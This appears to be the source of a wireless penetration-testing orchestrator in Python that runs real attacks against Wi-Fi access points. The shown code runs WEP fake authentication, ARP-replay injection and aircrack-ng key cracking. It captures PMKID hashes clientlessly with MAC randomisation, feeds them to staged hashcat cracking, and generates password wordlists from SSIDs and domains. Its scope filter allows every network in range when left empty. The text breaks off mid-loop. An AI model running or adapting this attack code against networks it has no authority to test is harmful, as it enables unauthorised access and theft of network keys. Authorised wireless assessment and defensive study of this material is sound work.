#!/usr/bin/env python3
"""
aether.py — Wireless Penetration Testing Orchestrator
======================================================
Orchestrates multi-phase wireless assessments via:
  Phase 0   — WEP IV capture and key cracking           (aircrack-ng suite)
  Phase 1a  — PMKID clientless capture + hashcat crack  (hcxdumptool / hashcat)
  Phase 1b  — WPA/WPA2/WPA3 handshake + WPS             (wifite2)
  Phase 2   — WPA-Enterprise rogue AP / cred harvest    (EAPHammer + asleap)
  Phase 3   — WPA3 SAE cryptographic vulnerability      (dragonslayer)
  Phase 4   — WPA3 SAE resource exhaustion              (dragondrain)
  Phase 5   — WPA2 KRACK key reinstallation testing     (krackattacks-scripts)

Protocol tokens (emitted to stdout for Spectre frontend):
  __SPECTRE_LOG__    <message>
  __SPECTRE_ERR__    <message>
  __SPECTRE_STATUS__ <json>
  __SPECTRE_FINDING__<json>
  __SPECTRE_PROMPT__ <message>

Usage:
  python3 aether.py --config config.json --project my_assessment
  python3 aether.py --phase pmkid --interface wlan1 --project quick_test
  python3 aether.py --list-phases
"""

import argparse
import json
import os
import platform
import re
import select
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from itertools import permutations as _permutations
from pathlib import Path

VERSION = "1.3.2"


def _clients_base() -> Path:
    """Return the OS-appropriate default parent directory for client project folders."""
    system = platform.system()
    if system == "Windows":
        base = Path("C:/clients")
    elif system == "Darwin":
        base = Path("/Users/Shared/clients")
    else:
        base = Path("/clients")
    base.mkdir(parents=True, exist_ok=True)
    return base


def _build_project_dir(client_short: str, start_date: str, tool_name: str) -> Path:
    """
    Build a structured project directory:
      <clients_base>/<client_short>/<year>/<tool_name>/<client_short>_<datetime>/
    """
    import re as _re
    slug = _re.sub(r'[^\w-]', '_', (client_short or 'client').strip().lower()).strip('_') or 'client'
    year = (start_date[:4] if start_date and len(start_date) >= 4 and start_date[:4].isdigit()
            else datetime.now().strftime('%Y'))
    dt_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    path = _clients_base() / slug / year / tool_name / f"{slug}_{dt_str}"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _write_project_meta(project_dir: Path, tool: str, client_short: str,
                        year: str, version: str) -> None:
    """Write project_meta.json so Flask apps can discover this project."""
    import json as _json
    try:
        (project_dir / "project_meta.json").write_text(
            _json.dumps({
                "tool":         tool,
                "client_short": client_short,
                "year":         year,
                "created_at":   datetime.now().isoformat(),
                "version":      version,
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass


# ── Findings catalogue ────────────────────────────────────────────────────────
_catalogue: dict[str, dict] = {}


def _load_catalogue() -> None:
    global _catalogue
    cat_path = Path(__file__).parent / "findings_catalogue.json"
    if cat_path.exists():
        try:
            entries = json.loads(cat_path.read_text(encoding="utf-8"))
            _catalogue = {e["id"]: e for e in entries}
        except Exception:
            pass


# ── In-process findings collector ────────────────────────────────────────────
_findings_collected: list[dict] = []

# ── Output protocol ───────────────────────────────────────────────────────────
_MANAGED = os.environ.get("SPECTRE_MANAGED", "") == "1"


def _tok(token: str, msg: str) -> None:
    print(f"{token} {msg}", flush=True)


def log(msg: str)    -> None: _tok("__SPECTRE_LOG__",     msg)
def err(msg: str)    -> None: _tok("__SPECTRE_ERR__",     msg)


def status(phase: str, label: str, state: str, step: str = "") -> None:
    _tok("__SPECTRE_STATUS__", json.dumps({
        "phase": phase, "label": label, "status": state, "step": step,
        "ts": datetime.now().isoformat(),
    }))


def finding(title: str, severity: str, description: str,
            data: dict | None = None, output_file: str = "",
            cvss_score: float | None = None, cvss_vector: str = "") -> None:
    rec = {
        "title": title, "severity": severity, "description": description,
        "data": data or {}, "output_file": output_file,
        "ts": datetime.now().isoformat(),
    }
    if cvss_score is not None:
        rec["cvss_score"]  = cvss_score
        rec["cvss_vector"] = cvss_vector
    _findings_collected.append(rec)
    _tok("__SPECTRE_FINDING__", json.dumps(rec))


def finding_from_cat(cat_id: str, data: dict | None = None,
                     output_file: str = "", title_override: str = "") -> None:
    """Emit a finding using catalogue as authoritative source for all metadata,
    including CVSS score and vector when present in the catalogue entry."""
    entry = _catalogue.get(cat_id, {})
    finding(
        title=title_override or entry.get("title", cat_id),
        severity=entry.get("severity", "HIGH"),
        description=entry.get("description", cat_id),
        data={**(data or {}), "catalogue_id": cat_id,
              "remediation": entry.get("remediation", "")},
        output_file=output_file,
        cvss_score=entry.get("cvss_score"),
        cvss_vector=entry.get("cvss_vector", ""),
    )


def save_findings(output_dir: Path) -> None:
    out = output_dir / "findings_spectre.json"
    out.write_text(json.dumps(_findings_collected, indent=2), encoding="utf-8")
    log(f"Findings written: {out} ({len(_findings_collected)} item(s))")


# ── Subprocess helpers ────────────────────────────────────────────────────────

def _popen(cmd: list, **kwargs) -> subprocess.Popen:
    kwargs.setdefault("stdin", subprocess.DEVNULL)
    return subprocess.Popen(cmd, **kwargs)


def _run(cmd: list, timeout: int = 60) -> tuple[str, int]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, stdin=subprocess.DEVNULL)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "(timeout)", -1
    except Exception as exc:
        return str(exc), -1


def _kill_proc(proc: subprocess.Popen, wait_secs: int = 5) -> None:
    """SIGTERM then SIGKILL if the process does not exit cleanly."""
    try:
        proc.terminate()
        proc.wait(timeout=wait_secs)
    except subprocess.TimeoutExpired:
        proc.kill()
        try:
            proc.wait(timeout=3)
        except Exception:
            pass
    except Exception:
        pass


def _readline_timed(stdout, deadline: float) -> bytes | None:
    """Read one line from a binary pipe honouring a wall-clock deadline."""
    remaining = deadline - time.time()
    if remaining <= 0:
        return None
    ready, _, _ = select.select([stdout], [], [], remaining)
    if not ready:
        return None
    line = stdout.readline()
    return line if line else None


# ── Scope enforcement ─────────────────────────────────────────────────────────
# Populated from config at startup; empty means "all targets allowed".
_scope_bssids: set[str] = set()
_scope_ssids:  set[str] = set()


def _in_scope(ap: dict) -> bool:
    """Return True if the AP is within the configured assessment scope.
    An empty scope means all APs are in-scope (default behaviour).
    Scope acts as a hard whitelist — any non-listed BSSID or SSID is blocked."""
    if not _scope_bssids and not _scope_ssids:
        return True
    bssid = ap.get("bssid", "").upper()
    ssid  = ap.get("ssid",  "")
    bssid_ok = not _scope_bssids or bssid in _scope_bssids
    ssid_ok  = not _scope_ssids  or ssid  in _scope_ssids
    if not (bssid_ok and ssid_ok):
        log(f"  OUT OF SCOPE — skipping {ssid!r} [{bssid}]")
        return False
    return True


# ── Privilege / pre-flight checks ─────────────────────────────────────────────

def _check_privileges() -> None:
    if os.geteuid() == 0:
        return
    _, rc = _run(["sudo", "-n", "true"], timeout=5)
    if rc != 0:
        err("WARNING: not running as root and passwordless sudo is unavailable. "
            "Wireless operations will fail. Run as root or configure NOPASSWD sudo.")


def _check_interface(interface: str) -> bool:
    sys_net = Path("/sys/class/net")
    if sys_net.exists():
        if (sys_net / interface).exists():
            return True
        available = ", ".join(sorted(p.name for p in sys_net.iterdir()))
        err(f"Interface '{interface}' not found. Available: {available}")
        return False
    _, rc = _run(["ifconfig", interface], timeout=5)
    if rc != 0:
        err(f"Interface '{interface}' not found (ifconfig rc={rc}).")
        return False
    return True


def _check_injection(monitor_iface: str) -> bool:
    """Test packet injection capability using aireplay-ng --test (-9).
    Returns True if injection is confirmed, False if it fails.
    A failed test is a warning, not a hard abort — some tools manage their
    own injection without relying on this test."""
    if not shutil.which("aireplay-ng"):
        log("[~] aireplay-ng not found — skipping injection test")
        return True
    log(f"Testing packet injection on {monitor_iface}...")
    out, rc = _run(["sudo", "aireplay-ng", "-9", "-e", "injectiontest",
                    monitor_iface], timeout=30)
    if "Injection is working!" in out or rc == 0:
        log(f"  Injection OK on {monitor_iface}")
        return True
    err(f"  Injection test failed on {monitor_iface}. "
        f"Deauthentication and ARP replay attacks may not work.\n{out[:300]}")
    return False


# ── Wordlist helpers ──────────────────────────────────────────────────────────

def _generate_ssid_wordlist(ssid: str, base_wordlist: str | None) -> str | None:
    """Generate a targeted wordlist seeded from the SSID name with common
    password mutations (year suffixes, numeric suffixes, case variants).
    Merges with base_wordlist when provided.
    Returns path to the generated temp file, or None on failure."""
    if not ssid:
        return base_wordlist

    mutations: list[str] = []
    candidates = [ssid, ssid.lower(), ssid.upper(), ssid.capitalize()]
    suffixes   = (
        [""] +
        [str(y) for y in range(2019, 2027)] +       # year variants
        ["!", "@", "#", "123", "1234", "12345",
         "0", "01", "001", "wifi", "pass", "admin"]
    )
    for base in candidates:
        for sfx in suffixes:
            w = base + sfx
            if 8 <= len(w) <= 63:   # WPA passphrase length bounds
                mutations.append(w)
        # Reversed
        rev = base[::-1]
        if 8 <= len(rev) <= 63:
            mutations.append(rev)

    seen: set[str] = set()
    deduped = [w for w in mutations if not (w in seen or seen.add(w))]  # type: ignore[func-returns-value]

    try:
        tmp = tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False, encoding="utf-8"
        )
        # SSID-derived mutations first (highest probability)
        for w in deduped:
            tmp.write(w + "\n")
        # Append base wordlist lines
        if base_wordlist and os.path.exists(base_wordlist):
            with open(base_wordlist, encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.rstrip("\n")
                    if 8 <= len(line) <= 63 and line not in seen:
                        tmp.write(line + "\n")
        tmp.close()
        log(f"  SSID wordlist: {len(deduped)} mutations + base → {tmp.name}")
        return tmp.name
    except Exception as exc:
        err(f"SSID wordlist generation failed: {exc}")
        return base_wordlist


def _build_domain_wordlist(domains: list[str], base_wordlist: str | None) -> str | None:
    """Build a targeted wordlist from provided domain names.

    Parsing  — strips TLDs/ccTLDs, splits on '.', '-', '_', and numeric
               boundaries to extract meaningful word components.
    Mutations— per-word: lowercase, UPPERCASE, Capitalize, CamelCase, l33t.
    Combos   — pairs of component words joined with common separators and
               year/symbol suffixes.
    Perms    — all orderings of the word set (capped at 4 words).
    All candidates are deduplicated and filtered to WPA passphrase length
    bounds (8–63 chars).  Returns path to a temp file, or base_wordlist when
    no domains are supplied.
    """
    if not domains:
        return base_wordlist

    _STRIP_SUFFIXES = {
        "com", "net", "org", "edu", "gov", "mil", "int", "co", "io", "ai",
        "info", "biz", "us", "uk", "ca", "au", "de", "fr", "jp", "cn",
        "tech", "app", "dev", "cloud", "online", "site", "web", "store",
        "shop", "blog", "news", "mail", "email",
    }

    raw_words: list[str] = []
    for domain in domains:
        domain = re.sub(r'^https?://', '', domain)
        labels = domain.lower().split('.')
        filtered = [lb for lb in labels if lb and lb not in _STRIP_SUFFIXES]
        for label in filtered:
            for part in re.split(r'[-_]', label):
                for sp in re.split(r'(\d+)', part):
                    if sp:
                        raw_words.append(sp)

    if not raw_words:
        return base_wordlist

    # Deduplicate component words preserving order
    seen_w: set[str] = set()
    unique_words: list[str] = []
    for w in raw_words:
        wl = w.lower()
        if wl and wl not in seen_w:
            seen_w.add(wl)
            unique_words.append(wl)

    def _mutations(word: str) -> list[str]:
        cap   = word[0].upper() + word[1:] if len(word) > 1 else word.upper()
        l33t  = (word.replace('a', '@').replace('e', '3')
                     .replace('i', '1').replace('o', '0').replace('s', '$'))
        variants = [word, word.lower(), word.upper(), word.capitalize(),
                    cap, l33t]
        # camelCase with next word handled at combination step; single-word
        # title is same as capitalize — skip duplicate
        return list(dict.fromkeys(v for v in variants if v))

    _sfx = (
        [""] +
        [str(y) for y in range(2019, 2027)] +
        ["!", "@", "#", "1", "12", "123", "1234", "12345",
         "0", "01", "001", "pass", "wifi", "admin", "key",
         "vpn", "wlan", "net", "2.4", "5g", "5ghz"]
    )
    _seps = ["", "-", "_", ".", "@", "!", "1", "123"]

    seen: set[str] = set()
    candidates: list[str] = []

    def _add(w: str) -> None:
        if w and w not in seen and 8 <= len(w) <= 63:
            seen.add(w)
            candidates.append(w)

    # Single-word mutations + suffixes
    for base in unique_words:
        for mut in _mutations(base):
            for sfx in _sfx:
                _add(mut + sfx)
                if sfx:
                    _add(sfx + mut)

    # Pairwise combinations (cap at 8 unique words to avoid explosion)
    capped = unique_words[:8]
    if len(capped) >= 2:
        for i, w1 in enumerate(capped):
            for w2 in capped:
                if w1 == w2:
                    continue
                for m1 in _mutations(w1)[:3]:
                    for m2 in _mutations(w2)[:3]:
                        for sep in _seps:
                            _add(m1 + sep + m2)
                            for sfx in ["", "!", "1", "123"]:
                                _add(m1 + sep + m2 + sfx)

    # Permutations of up to 4 words (up to 4! = 24 orderings)
    perm_src = capped[:4]
    if len(perm_src) >= 2:
        for r in range(2, len(perm_src) + 1):
            for perm in _permutations(perm_src, r):
                joined = "".join(perm)
                _add(joined)
                for sep in ["-", "_", "."]:
                    _add(sep.join(perm))
                for sfx in ["", "!", "1", "123"]:
                    _add(joined + sfx)

    try:
        tmp = tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False, encoding="utf-8"
        )
        for w in candidates:
            tmp.write(w + "\n")
        if base_wordlist and os.path.exists(base_wordlist):
            with open(base_wordlist, encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.rstrip("\n")
                    if 8 <= len(line) <= 63 and line not in seen:
                        seen.add(line)
                        tmp.write(line + "\n")
        tmp.close()
        log(f"  Domain wordlist: {len(candidates)} entries from "
            f"{len(domains)} domain(s) → {tmp.name}")
        return tmp.name
    except Exception as exc:
        err(f"Domain wordlist generation failed: {exc}")
        return base_wordlist


# ── Monitor mode management ───────────────────────────────────────────────────

def enable_monitor_mode(interface: str, monitor_iface: str) -> str:
    log(f"Enabling monitor mode on {interface}...")
    if shutil.which("airmon-ng"):
        _run(["sudo", "airmon-ng", "check", "kill"])
        out, _ = _run(["sudo", "airmon-ng", "start", interface])
        m = re.search(
            r'(?:monitor\s+mode(?:\s+vif)?\s+enabled(?:\s+on)?'
            r'|enabled\s+on)\s+([\w-]+)',
            out, re.I,
        )
        if m:
            detected = m.group(1).strip()
            log(f"Monitor mode enabled: {detected}")
            return detected
        # Filesystem fallback
        sys_net = Path("/sys/class/net")
        if sys_net.exists():
            candidates = [
                p.name for p in sys_net.iterdir()
                if "mon" in p.name.lower() and p.name != interface
            ]
            if candidates:
                detected = candidates[0]
                log(f"Monitor interface via /sys: {detected}")
                return detected
        log(f"Monitor mode started — using configured name {monitor_iface}")
        return monitor_iface
    _run(["sudo", "ip", "link", "set", interface, "down"])
    _run(["sudo", "iw", interface, "set", "monitor", "none"])
    _run(["sudo", "ip", "link", "set", interface, "up"])
    log(f"Monitor mode set via iw on {interface}")
    return interface


def disable_monitor_mode(monitor_iface: str, original_iface: str) -> None:
    if shutil.which("airmon-ng"):
        _run(["sudo", "airmon-ng", "stop", monitor_iface])
    else:
        _run(["sudo", "ip", "link", "set", monitor_iface, "down"])
        _run(["sudo", "iw", monitor_iface, "set", "type", "managed"])
        _run(["sudo", "ip", "link", "set", monitor_iface, "up"])
    if sys.platform.startswith("linux"):
        if shutil.which("systemctl"):
            _run(["sudo", "systemctl", "restart", "NetworkManager"],  timeout=20)
            _run(["sudo", "systemctl", "restart", "wpa_supplicant"],  timeout=20)
        elif shutil.which("service"):
            _run(["sudo", "service", "NetworkManager", "restart"], timeout=20)
    log(f"Monitor mode disabled — {original_iface} restored to managed mode")


# ── WPS detection ─────────────────────────────────────────────────────────────

def _detect_wps(monitor_iface: str, timeout: int = 20) -> set[str]:
    """Run wash to enumerate WPS-enabled APs. Returns set of uppercase BSSIDs."""
    if not shutil.which("wash"):
        return set()
    log(f"WPS scan (wash) on {monitor_iface} for {timeout}s...")
    wps_bssids: set[str] = set()
    proc = None
    try:
        proc = _popen(
            ["sudo", "wash", "-i", monitor_iface, "-C"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
        )
        if proc.stdout is None:
            return wps_bssids
        deadline = time.time() + timeout
        while True:
            line = _readline_timed(proc.stdout, deadline)
            if line is None:
                break
            decoded = line.decode("utf-8", errors="replace").strip()
            # wash output columns: BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID
            m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', decoded)
            if m:
                wps_bssids.add(m.group(1).upper())
    except Exception:
        pass
    finally:
        if proc is not None:
            _kill_proc(proc)
    return wps_bssids


# ── Target AP scanning ────────────────────────────────────────────────────────

def scan_targets(
    monitor_iface: str,
    target_ssids: list,
    target_bssids: list | None = None,
    timeout: int = 30,
    channel: int | None = None,
) -> list[dict]:
    """
    Passive AP scan (airodump-ng preferred, iwlist fallback) combined with
    parallel WPS enumeration (wash).
    Returns list of {ssid, bssid, channel, encryption, wps} dicts.
    Emits findings for: open networks, WPS-enabled APs, WPA3-Transition mode.

    NOTE: Hidden SSIDs require active probing (mdk4 probe mode or directed
    wpa_supplicant probe requests) — not implemented here; this scan is passive.
    """
    target_bssids = target_bssids or []
    log(f"Scanning for wireless networks (timeout={timeout}s)...")

    # Run WPS detection in parallel (background — does not block AP scan)
    wps_proc    = None
    wps_bssids: set[str] = set()
    if shutil.which("wash"):
        try:
            wps_proc = _popen(
                ["sudo", "wash", "-i", monitor_iface, "-C"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            )
        except Exception:
            pass

    discovered: list[dict] = []

    if shutil.which("airodump-ng"):
        import tempfile as _tempfile
        with _tempfile.TemporaryDirectory() as tmp:
            out_prefix = os.path.join(tmp, "scan")
            cmd = [
                "sudo", "airodump-ng",
                "--write", out_prefix, "--output-format", "csv",
            ]
            if channel:
                cmd += ["--channel", str(channel)]
            else:
                cmd += ["--band", "abg"]
            cmd += [monitor_iface]
            proc = None
            try:
                proc = _popen(cmd, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL)
                time.sleep(timeout)
            except Exception:
                pass
            finally:
                if proc is not None:
                    _kill_proc(proc)

            csv_file = out_prefix + "-01.csv"
            if os.path.exists(csv_file):
                try:
                    with open(csv_file, encoding="utf-8", errors="replace") as f:
                        lines = f.read().splitlines()
                    for raw in lines[2:]:
                        stripped = raw.strip()
                        if not stripped or stripped.lower().startswith("station mac"):
                            break
                        parts = [p.strip() for p in stripped.split(",")]
                        if len(parts) < 14:
                            continue
                        bssid = parts[0]
                        if not re.match(
                            r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid
                        ):
                            continue
                        channel_str = parts[3].strip()
                        enc         = parts[5].strip()
                        ssid        = parts[13].strip()
                        try:
                            ch = int(channel_str)
                        except ValueError:
                            ch = 0
                        ssid_ok  = (not target_ssids)  or (ssid  in target_ssids)
                        bssid_ok = (not target_bssids) or (
                            bssid.upper() in [b.upper() for b in target_bssids]
                        )
                        if ssid_ok and bssid_ok:
                            discovered.append({
                                "ssid": ssid, "bssid": bssid,
                                "channel": ch, "encryption": enc, "wps": False,
                            })
                except Exception as exc:
                    err(f"Scan CSV parse error: {exc}")
    else:
        # iwlist fallback
        out, _ = _run(["sudo", "iwlist", monitor_iface, "scan"], timeout=30)
        current: dict = {}

        def _commit(ap: dict) -> None:
            if not ap.get("ssid"):
                return
            ssid_ok  = (not target_ssids) or (ap["ssid"] in target_ssids)
            bssid_ok = (not target_bssids) or (
                ap.get("bssid", "").upper() in [b.upper() for b in target_bssids]
            )
            if ssid_ok and bssid_ok:
                discovered.append(ap)

        for line in out.splitlines():
            line = line.strip()
            if "Cell" in line and "Address:" in line:
                _commit(current)
                m = re.search(r'Address:\s+(\S+)', line)
                current = {
                    "bssid": m.group(1) if m else "", "ssid": "",
                    "channel": 0, "encryption": "UNKNOWN", "wps": False,
                }
            elif "ESSID:" in line:
                m = re.search(r'ESSID:"([^"]*)"', line)
                if m:
                    current["ssid"] = m.group(1)
            elif "Channel:" in line:
                m = re.search(r'Channel:(\d+)', line)
                if m:
                    current["channel"] = int(m.group(1))
            elif "IE:" in line:
                if re.search(r'WPA2\s+Version|RSN', line, re.I):
                    current["encryption"] = "WPA2"
                elif re.search(r'WPA\s+Version', line, re.I):
                    if current.get("encryption") not in ("WPA2",):
                        current["encryption"] = "WPA"
            elif "Encryption key:" in line:
                if current.get("encryption") == "UNKNOWN":
                    current["encryption"] = "WEP" if "on" in line else "OPN"
        _commit(current)

    # Harvest WPS results from background wash process
    if wps_proc is not None:
        try:
            # Drain remaining output collected during airodump-ng sleep
            remaining_out, _ = wps_proc.communicate(timeout=3)
            for line in remaining_out.decode("utf-8", errors="replace").splitlines():
                m = re.match(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', line.strip())
                if m:
                    wps_bssids.add(m.group(1).upper())
        except Exception:
            _kill_proc(wps_proc)

    # Annotate discovered APs with WPS status + emit per-AP findings
    log(f"Discovered {len(discovered)} target AP(s)")
    for ap in discovered:
        bssid_upper = ap.get("bssid", "").upper()
        enc         = ap.get("encryption", "")
        ssid        = ap.get("ssid", "")

        # Mark WPS status
        if bssid_upper in wps_bssids:
            ap["wps"] = True

        log(f"  AP: {ssid!r} [{ap['bssid']}] "
            f"ch={ap['channel']} enc={enc} wps={ap['wps']}")

        # Open / unencrypted network
        if not enc or enc.upper() in ("OPN", "OPEN"):
            finding_from_cat(
                "AETHER-014",
                data={"ssid": ssid, "bssid": ap["bssid"], "channel": ap["channel"]},
                title_override=f"Open / Unencrypted Network: {ssid}",
            )

        # WPS enabled — exposes AP to Pixie-Dust and PIN brute-force
        if ap["wps"]:
            finding_from_cat(
                "AETHER-015",
                data={"ssid": ssid, "bssid": ap["bssid"], "channel": ap["channel"]},
                title_override=f"WPS Enabled: {ssid}",
            )

        # WPA3-Transition mode — WPA2+WPA3 mixed; downgrade surface
        # airodump-ng reports transition APs with "WPA2 WPA3" or "SAE WPA2" in enc field
        if (re.search(r'WPA3|SAE', enc, re.I) and re.search(r'WPA2|PSK', enc, re.I)):
            finding_from_cat(
                "AETHER-016",
                data={"ssid": ssid, "bssid": ap["bssid"], "encryption": enc},
                title_override=f"WPA3 Transition Mode (Downgrade Surface): {ssid}",
            )

    return discovered


# ── Phase 0: WEP IV capture + PTW cracking ───────────────────────────────────

def phase_wep(
    monitor_iface: str,
    target_aps: list[dict],
    output_dir: Path,
    timeout: int = 300,
) -> None:
    """
    Phase 0: WEP testing via IV capture + ARP replay injection + PTW crack.
    Includes fake open-system authentication (aireplay-ng -1) to ensure
    the attacking station is associated before injecting ARPs — required
    when the AP has no active clients.
    """
    if not shutil.which("aircrack-ng") or not shutil.which("airodump-ng"):
        status("p0_wep", "Phase 0: WEP Testing", "skipped", "aircrack-ng not installed")
        return

    wep_aps = [
        ap for ap in target_aps
        if _in_scope(ap)
        and "WEP" in ap.get("encryption", "").upper()
        and "WPA" not in ap.get("encryption", "").upper()
    ]
    if not wep_aps:
        status("p0_wep", "Phase 0: WEP Testing", "skipped", "no WEP networks found")
        return

    status("p0_wep", "Phase 0: WEP Testing", "running")
    wep_dir = output_dir / "wep"
    wep_dir.mkdir(parents=True, exist_ok=True)

    for ap in wep_aps[:3]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        safe    = re.sub(r'[^\w]', '_', ssid or bssid)

        finding_from_cat(
            "AETHER-012",
            data={"ssid": ssid, "bssid": bssid, "channel": channel},
            title_override=f"WEP Encryption in Use: {ssid}",
        )

        cap_prefix = str(wep_dir / f"cap_{safe}")

        # Step 1: fake open-system authentication — associates our NIC so
        # we can inject ARP packets even when no legitimate client is present.
        if shutil.which("aireplay-ng"):
            log(f"[0] WEP: fake auth → {ssid!r} [{bssid}]")
            _run([
                "sudo", "aireplay-ng",
                "-1", "0",          # fake auth, reassoc interval 0
                "-e", ssid,
                "-a", bssid,
                monitor_iface,
            ], timeout=15)

        dump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", bssid, "--channel", str(channel),
            "--write", cap_prefix, "--output-format", "cap",
            monitor_iface,
        ]
        replay_cmd = [
            "sudo", "aireplay-ng",
            "--arpreplay", "-b", bssid, "-x", "1000",
            monitor_iface,
        ]

        log(f"[0] WEP: IV capture + ARP replay on {ssid!r} [{bssid}] ch={channel}")
        dump_proc   = None
        replay_proc = None
        try:
            dump_proc = _popen(dump_cmd,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            replay_proc = _popen(replay_cmd,
                                  stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if replay_proc.stdout is None:
                raise RuntimeError("aireplay-ng stdout unavailable")
            deadline = time.time() + timeout
            last_crack = time.time()
            while True:
                line = _readline_timed(replay_proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                if decoded:
                    log(decoded)
                # Progressive crack: attempt every 5 000 new IVs
                iv_m = re.search(r'#Data:\s*(\d+)', decoded)
                if iv_m and int(iv_m.group(1)) >= 5000 and time.time() - last_crack > 30:
                    last_crack = time.time()
                    cap_files  = sorted(wep_dir.glob(f"cap_{safe}*.cap"))
                    if cap_files:
                        quick_out, _ = _run(
                            ["sudo", "aircrack-ng", "-b", bssid]
                            + [str(c) for c in cap_files],
                            timeout=30,
                        )
                        if "KEY FOUND!" in quick_out:
                            log("[0] WEP: key found during progressive crack — stopping")
                            break
        finally:
            if replay_proc is not None:
                _kill_proc(replay_proc)
            if dump_proc is not None:
                _kill_proc(dump_proc)

        # Final PTW crack on all collected captures
        cap_files = sorted(wep_dir.glob(f"cap_{safe}*.cap"))
        if not cap_files:
            log(f"[0] WEP: no capture files for {ssid!r}")
            continue
        crack_cmd  = ["sudo", "aircrack-ng", "-b", bssid] + [str(c) for c in cap_files]
        log(f"[0] WEP: final PTW crack on {len(cap_files)} file(s)")
        crack_out, _ = _run(crack_cmd, timeout=120)
        log(crack_out)
        m_key = re.search(r'KEY FOUND!\s*\[([^\]]+)\]', crack_out, re.I)
        if m_key:
            finding_from_cat(
                "AETHER-013",
                data={"ssid": ssid, "bssid": bssid, "key": m_key.group(1)},
                output_file=cap_prefix + "-01.cap",
                title_override=f"WEP Key Cracked: {ssid}",
            )

    status("p0_wep", "Phase 0: WEP Testing", "complete")


# ── Phase 1a: hcxdumptool — clientless PMKID capture + hashcat cracking ───────

def phase_pmkid(
    monitor_iface: str,
    target_aps: list[dict],
    output_dir: Path,
    timeout: int = 60,
    wordlist: str | None = None,
    hashcat_rules: list[str] | None = None,
) -> None:
    """
    Phase 1a: Dedicated PMKID clientless capture using hcxdumptool.
    The PMKID attack requires only a single frame exchange with the AP —
    no connected clients and no deauthentication needed.
    After capture, attempts hashcat cracking with staged wordlists + rules.

    Tool chain: hcxdumptool → hcxpcapngtool → hashcat (-m 22000)
    """
    if not shutil.which("hcxdumptool") or not shutil.which("hcxpcapngtool"):
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "skipped",
               "hcxdumptool / hcxpcapngtool not installed")
        return

    scoped_aps = [ap for ap in target_aps if _in_scope(ap)]
    if not scoped_aps:
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "skipped", "no targets")
        return

    status("p1a_pmkid", "Phase 1a: PMKID Capture", "running")
    pmkid_dir = output_dir / "pmkid"
    pmkid_dir.mkdir(parents=True, exist_ok=True)

    # Build BSSID filter file for hcxdumptool
    bssid_filter = pmkid_dir / "bssids.txt"
    bssids = [ap["bssid"] for ap in scoped_aps if ap.get("bssid")]
    if bssids:
        bssid_filter.write_text("\n".join(bssids) + "\n", encoding="utf-8")

    pcapng_file = pmkid_dir / "capture.pcapng"
    cmd = [
        "sudo", "hcxdumptool",
        "-i", monitor_iface,
        "-w", str(pcapng_file),
        "--rds=1",              # randomize source MAC per frame
    ]
    if bssids:
        cmd += [f"--filterlist_ap={bssid_filter}", "--filtermode=2"]

    log(f"[1a] hcxdumptool: PMKID capture ({timeout}s, {len(bssids)} target(s))")
    proc = None
    try:
        proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(timeout)
    except Exception:
        pass
    finally:
        if proc is not None:
            _kill_proc(proc)

    if not pcapng_file.exists() or pcapng_file.stat().st_size == 0:
        log("[1a] hcxdumptool: no capture data collected")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    # Convert pcapng → hc22000
    hc22000_file = pmkid_dir / "hashes.hc22000"
    conv_out, rc = _run([
        "hcxpcapngtool",
        "-o", str(hc22000_file),
        str(pcapng_file),
    ], timeout=60)
    log(conv_out.strip())

    if not hc22000_file.exists() or hc22000_file.stat().st_size == 0:
        log("[1a] hcxpcapngtool: no PMKID/EAPOL hashes extracted")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    # Count extracted hashes and emit a finding for each SSID captured
    hash_lines = [l for l in hc22000_file.read_text(encoding="utf-8").splitlines() if l.strip()]
    log(f"[1a] Extracted {len(hash_lines)} PMKID/EAPOL hash(es)")
    seen_ssids: set[str] = set()
    for hl in hash_lines:
        # hc22000 format: type*bssid_hex*client_hex*essid_hex*hash
        parts = hl.split("*")
        if len(parts) >= 4:
            try:
                ssid_from_hash = bytes.fromhex(parts[3]).decode("utf-8", errors="replace")
            except Exception:
                ssid_from_hash = ""
            if ssid_from_hash and ssid_from_hash not in seen_ssids:
                seen_ssids.add(ssid_from_hash)
                finding_from_cat(
                    "AETHER-017",
                    data={"ssid": ssid_from_hash, "hash_file": str(hc22000_file)},
                    output_file=str(hc22000_file),
                    title_override=f"PMKID / EAPOL Hash Captured: {ssid_from_hash}",
                )

    # Attempt hashcat cracking if available
    if not shutil.which("hashcat"):
        log("[1a] hashcat not available — hash file saved for external cracking")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    rules = hashcat_rules or []
    # Stage 1: wordlist only (targeted)
    stages: list[tuple[str | None, str | None]] = [(wordlist, None)]
    # Stage 2+: wordlist + each rule file
    for rule in rules:
        if os.path.exists(rule):
            stages.append((wordlist, rule))

    for stage_wl, stage_rule in stages:
